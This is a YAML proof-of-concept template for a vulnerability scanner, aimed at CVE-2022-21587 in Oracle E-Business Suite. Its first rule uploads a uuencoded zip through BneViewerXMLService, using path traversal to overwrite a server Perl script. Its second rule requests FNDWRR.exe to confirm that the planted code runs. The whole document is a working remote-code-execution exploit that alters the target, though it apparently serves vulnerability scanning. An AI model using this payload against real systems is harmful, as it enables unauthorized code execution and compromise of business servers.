name: poc-yaml-oracle-ebs-bneviewerxmlservice-fileupload
binding: eedc251f-2ab8-463a-9a47-a573f2679f2a
manual: true
detail:
    author: y0y0
    links:
        - https://github.com/Zh1z3ven/Oracle-E-BS-CVE-2022-21587-Exploit
    vulnerability:
        level: critical
transport: http
set:
    rboundary: randomLowercase(8)
    rstr1: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /OA_HTML/BneViewerXMLService?bne:uueupload=TRUE
            headers:
                Content-Type: multipart/form-data; boundary=********************{{rboundary}}
            body: "--********************{{rboundary}}\nContent-Disposition: form-data; name=\"uploadfilename\"; filename=\"tempp.zip\"\nContent-Type: application/octet-stream\n\nbegin 644 tempp.zip\nM4$L#!!0 \" @( \"2#:E8               !#    +BXO+BXO+BXO+BXO+BXO\nM1DU77TAO;64O3W)A8VQE7T5\"4RUA<' Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.\nM1%=24BYP;\"LM3E5P=O>TYBHHRLPK 3&MK#)2$U-2BS04=$LJ\"U(5;.T4U$M2\nM*TKT\"W(2,_/4%32MN7(K%522<U,4;*'J2TH*-(!JBDO4-6$&@>2MN4KS<C+S\nMLC7BX]T\\?5SCXS6M4RLR2ZP!4$L'\"(WHV(YE    =    %!+ 0(4 !0 \" @(\nM \"2#:E:-Z-B.90   '0   !#                       N+B\\N+B\\N+B\\N\nM+B\\N+B]&35=?2&]M92]/<F%C;&5?14)3+6%P<#$O8V]M;6]N+W-C<FEP=',O\nB='AK1DY$5U)2+G!L4$L%!@     !  $ <0   -8       $!\n \nend\n\n--********************{{rboundary}}--\n"
        expression: response.status == 200 && response.body_string.startsWith("<?xml") && response.body_string.contains("bne:text=\"")
    r1:
        request:
            cache: true
            method: GET
            path: /OA_CGI/FNDWRR.exe
            headers:
                test: '{{rstr1}}'
        expression: response.status == 200 && response.body_string.startsWith(rstr1)
expression: r0() && r1()
